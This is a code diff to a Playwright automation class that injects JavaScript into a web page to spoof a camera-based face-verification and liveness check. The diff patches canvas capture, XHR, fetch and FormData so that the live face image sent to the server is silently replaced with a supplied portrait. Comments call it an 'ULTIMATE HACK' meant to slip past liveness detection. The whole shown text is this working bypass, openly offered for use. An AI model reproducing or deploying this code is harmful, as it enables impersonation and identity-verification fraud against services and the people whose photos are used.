@@ -268,29 +268,64 @@ class PlaywrightRunner:
 		  /* ---------- save originals ---------- */
 		  const _origGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
 		  const _origEnumerate    = navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices);
-		  const _origToDataURL    = HTMLCanvasElement.prototype.toDataURL;
-		  const _origToBlob       = HTMLCanvasElement.prototype.toBlob;
+		  /* ---------- ULTIMATE HACK: Inject HD Portrait safely without breaking Liveness ---------- */
+		  const _origToDataURL = HTMLCanvasElement.prototype.toDataURL;
+		  const _origToBlob    = HTMLCanvasElement.prototype.toBlob;
+		  let lastCapturedFaceRaw = "";
+		  const hdPortraitRaw = "{portrait_b64}".split(',')[1];
 		  
-		  /* ---------- override toDataURL & toBlob to inject HD crop to Server ---------- */
+		  // 1. Theo dõi toDataURL để lấy mẫu ảnh (không thay đổi kết quả để liveness vẫn chạy mượt)
 		  HTMLCanvasElement.prototype.toDataURL = function(type, encoderOptions) {{
-		      const video = document.querySelector('video');
-		      if (video && video.readyState >= 2 && document.querySelector('.box-camera')) {{
-		          console.log("[FakeCam] HACKED toDataURL! Injecting HD Portrait to Server!");
-		          return "{portrait_b64}";
+		      const res = _origToDataURL.apply(this, arguments);
+		      if (res && res.length > 50000) {{
+		          const parts = res.split(',');
+		          if (parts.length === 2) lastCapturedFaceRaw = parts[1];
 		      }}
-		      return _origToDataURL.apply(this, arguments);
+		      return res;
 		  }};
 		  
+		  // 2. Thay thế toBlob (thường chỉ dùng 1 lần lúc chụp thật)
 		  HTMLCanvasElement.prototype.toBlob = function(callback, type, quality) {{
-		      const video = document.querySelector('video');
-		      if (video && video.readyState >= 2 && document.querySelector('.box-camera')) {{
+		      if (this.width >= 400 && this.height >= 400) {{
 		          console.log("[FakeCam] HACKED toBlob! Injecting HD Portrait to Server!");
-		          fetch("{portrait_b64}")
-		              .then(res => res.blob())
-		              .then(blob => callback(blob));
+		          fetch("{portrait_b64}").then(res => res.blob()).then(blob => callback(blob));
 		          return;
 		      }}
 		      return _origToBlob.apply(this, arguments);
+		  }};
+
+		  // 3. Đánh chặn XHR (Thay ruột gói tin API trước khi bay lên server)
+		  const _origXHRSend = XMLHttpRequest.prototype.send;
+		  XMLHttpRequest.prototype.send = function(body) {{
+		      if (typeof body === 'string' && lastCapturedFaceRaw && hdPortraitRaw) {{
+		          if (body.includes(lastCapturedFaceRaw)) {{
+		              console.log("[FakeCam] HACKED XHR! Gửi ảnh siêu nét lên server.");
+		              body = body.replace(lastCapturedFaceRaw, hdPortraitRaw);
+		          }}
+		      }}
+		      return _origXHRSend.apply(this, arguments);
+		  }};
+
+		  // 4. Đánh chặn fetch API
+		  const _origFetch = window.fetch;
+		  window.fetch = async function(...args) {{
+		      if (args[1] && typeof args[1].body === 'string' && lastCapturedFaceRaw && hdPortraitRaw) {{
+		          if (args[1].body.includes(lastCapturedFaceRaw)) {{
+		              console.log("[FakeCam] HACKED fetch! Gửi ảnh siêu nét lên server.");
+		              args[1].body = args[1].body.replace(lastCapturedFaceRaw, hdPortraitRaw);
+		          }}
+		      }}
+		      return _origFetch.apply(this, args);
+		  }};
+
+		  // 5. Đánh chặn FormData (Trường hợp API dùng form-data)
+		  const _origAppend = FormData.prototype.append;
+		  FormData.prototype.append = function(name, value, filename) {{
+		      if (typeof value === 'string' && lastCapturedFaceRaw && hdPortraitRaw && value.includes(lastCapturedFaceRaw)) {{
+		          console.log("[FakeCam] HACKED FormData! Gửi ảnh siêu nét lên server.");
+		          value = value.replace(lastCapturedFaceRaw, hdPortraitRaw);
+		      }}
+		      return _origAppend.apply(this, arguments);
 		  }};
 
 		  /* ---------- constants ---------- */
